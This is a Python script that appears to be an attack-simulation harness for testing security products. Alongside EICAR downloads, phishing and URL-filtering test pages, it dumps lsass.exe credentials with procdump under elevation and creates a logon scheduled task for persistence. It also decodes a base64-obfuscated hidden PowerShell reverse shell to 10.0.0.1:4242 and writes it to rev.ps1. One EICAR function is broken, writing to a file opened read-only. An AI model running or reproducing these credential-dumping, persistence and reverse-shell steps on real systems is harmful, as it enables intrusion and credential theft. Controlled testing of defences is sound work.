import requests
import webbrowser
import os
import zipfile
import prettytable
import tempfile
import win32api
import base64


def avtest():
    """
    Download the file from eicar to the current directory
    :return:
    """
    url = 'https://secure.eicar.org/eicar.com'
    r = requests.get(url, allow_redirects=True)
    open('eicar.com', 'wb').write(r.content)

def antibot_test():
    """
    HTTP GET to the botnet server
    :return:
    """
    cp_url = "http://www.threat-cloud.com/test/files/HighConfidenceBot.html"
    header = {'user-agent': '*<|>*'}
    r_cp = requests.get(cp_url, headers=header)
    print(r_cp.status_code)


def zero_phishing():
    """
    Open the zero phishing test page with the new browser windows
    :return:
    """
    url = "http://salesforce.sbm-demo.xyz/phishing"
    webbrowser.open_new(url)


def on_access_av():
    """
    Extract the password encrypted archive which containing eicar av test file.
    """
    loc = os.getcwd()
    print(loc)
    zip = zipfile.ZipFile('testtool.zip')
    password = bytes("demo",'utf-8')
    zip.extractall(path=loc, pwd=password)
    if os.name == 'nt':
        os.system('type test.eicar')
    else:
        os.system('cat test.eicar')


def on_access_av_base64():
    eicar = 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
    decode_e = base64.b64decode(eicar)
    dec_eicar = decode_e.decode('ascii')
    with open('eicar.com') as file:
        file.write(dec_eicar)


def cred_dump():
    """
    dump the lsass.exe using procdump
    """
    loc = os.getcwd()
    print(loc)
    zip = zipfile.ZipFile('testtool.zip')
    password = bytes("demo",'utf-8')
    zip.extract('procdump.exe')
    payload = loc + "\\procdump.exe -ma lsass.exe lsass.dmp"
    tmp_file_path = tempfile.gettempdir() + "\\dump.bat"
    with open(tmp_file_path, 'w') as f:
        f.write(payload)
    win32api.ShellExecute(0, 'runas', tmp_file_path, "", "", 1)



def url_filtering():
    """
    browse to the website to check the url filtering policy
    """
    url = [[1, "gamblimg", "http://www.gambling.com"], [2, "news","http://bbc.com"]]
    table = prettytable.PrettyTable()
    table.field_names = ["Id", "Catagory", "URL"]
    table.add_rows(url)
    print(table)
    choice = input("Please select the Id of the URL to start the test: ")
    if choice.isnumeric() and int(choice)<=len(url) and int(choice)>0:
        url_id = int(choice)-1
        webbrowser.open(url[url_id][2])


def sch_task():
    """
    write the script to temp folder then put it in schedule task
    """
    tmp_file_path = tempfile.gettempdir() + "\\sch.bat"
    payload = "schtasks /create /SC ONLOGON /TN " + r'"POC\rev"' + " /TR " + r'"C:\Sysinternal\SysinternalsSuite\procexp.exe"'
    #test = "notepad"
    with open(tmp_file_path, 'w') as f:
        f.write(payload)
    win32api.ShellExecute(0, 'runas', tmp_file_path, "", "",1)


def revshell_te():
    payload = 'cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCIxMC4wLjAuMSIsNDI0Mik7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syICA9ICRzZW5kYmFjayArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCk='
    decode_p = base64.b64decode(payload)
    dec_p = decode_p.decode('ascii')
    with open('rev.ps1', 'w') as f:
        f.write(dec_p)
